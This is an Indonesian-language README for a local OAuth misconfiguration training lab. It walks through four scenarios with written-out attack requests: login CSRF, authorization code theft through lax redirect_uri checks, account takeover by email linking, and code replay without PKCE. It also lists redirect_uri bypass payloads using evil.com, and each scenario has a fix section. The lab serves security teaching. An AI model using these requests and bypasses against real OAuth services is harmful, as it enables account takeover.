# Payload & Exploit OAuth Misconfiguration Lab

Semua skenario default **RENTAN**. Klik **Jalankan Exploit** di kartu scenario untuk serangan
otomatis (jejak lengkap tercatat di *Attacker Logs*), atau replikasi manual dengan request di bawah.

Target flag ada di akun **victim@corp.test**:
`OAUTH-LAB{FLAG_Victim_Akun_Ambil_Melalui_OAuth_8841}`

---

## S1 — Missing state (OAuth Login CSRF)

Client mengecek `state` **tidak ada** saat callback. Attacker menjadikan code untuk akunnya
sendiri, korban membuka link → sesi korban jadi akun attacker.

```
GET /oauth/authorize?client_id=oauthlab-client&redirect_uri=http://127.0.0.1:5070/cb&scope=profile email
# (tanpa &state=... )

GET /cb?code=<code_attacker>
```

Observe: pada `/cb`, server tidak membandingkan `state` dengan nilai yang dikirim client kala
mulai login → sesi tergores ke akun attacker.

**Fix:** client harus membuat `state` acak per sesi, sertakan saat authorize, dan TOLAK bila
hubungan di callback tidak cocok. Di lab: toggle S1 → FIXED → exploit diblokir.

Isi payload di callback bila `state` tidak ada: 403 "state missing/mismatch".

---

## S2 — redirect_uri Validation Cacat (Token Leak)

Provider hanya memvalidasi **host** (`127.0.0.1` / `localhost`), path bebas. Attacker memakai
redirect_uri menuju path server penyerang sendiri (`/evil/s2_capture`):

```
GET /oauth/authorize?client_id=oauthlab-client&redirect_uri=http://127.0.0.1:5070/evil/s2_capture&scope=profile email
```

Setelah korban approve → browser (bukan 302 ke `/cb`) tetapi ke `/evil/s2_capture?code=…`.
Server penyerang **menangkap code** lalu menukar jadi `access_token` victim:

```
POST /oauth/token  (penyerang)
code=<code_curian>
```

`GET /oauth/me` dengan token itu = identitas victim.

**Fix:** daftar putih redirect_uri **exact match** (atau minimal path + host + skema persis).
Bentuk-bentuk bypass yang sering ketemu di BBP:

```
redirect_uri=http://target.com.evil.com/cb
redirect_uri=http://evil.com@target.com/cb
redirect_uri=http://target.com/cb/../evil
redirect_uri=http://target.com%2Fcb.evil.com
redirect_uri=https://target.com.evil.com
```

---

## S3 — Account Linking by Email + email_verified (ATO)

Attacker mendaftar akun di provider dengan email victim (`victim@corp.test`) lalu menandainya
tidak diverifikasi (di lab: akun **evilclone**). Client app menautkan akun hanya berdasar klaim
`email`, tanpa memeriksa `email_verified`:

```
# login sebagai evilclone (provider identity), lalu:
GET /oauth/authorize?client_id=oauthlab-client&redirect_uri=http://127.0.0.1:5070/cb&scope=profile email
GET /cb?code=<code_evilclone>
```

Klaim token: `email=victim@corp.test`, `email_verified=false` → client tetap menemukan akun
victim → sesi dibajak.

**Fix:** jangan pernah mempercayai `email` dari provider; wajib cek `email_verified==true`
(atau relasikan sub/issuer yang terverifikasi), dan jangan auto-link by email.

---

## S4 — No PKCE + Code Reusable (Code Replay → ATO)

Client tidak mengirim `code_challenge`, provider tidak mengecek verifier, dan code dapat
ditukar berkali-kali dalam 10 menit. Attacker memotong code korban lalu menukarnya **2 kali**:

```
POST /oauth/token  (exchange #1)
code=<code_victim>

POST /oauth/token  (exchange #2 — REPLAY, code sama)
code=<code_victim>
```

Variant kedua: tanpa PKCE, token exchange bisa dipanggil berulang → token baru terus terbit.

**Fix:** PKCE (S256) wajib sebagai code challenge pada authorize dan `code_verifier` pada
token, plus authorization code **one-time use** (used flag) + TTL pendek + client authentication
bila confidential client.

---

## Catatan

- `_finish` pada `/api/poc/<s>` menampilkan hasil exploit; mode per skenario bisa diganti lewat
  kartu Dashboard (toggle) → perbandingan langsung RENTAN vs FIXED.
- Semua data log: tabel `attack_logs` (SQLite `database/lab.db`).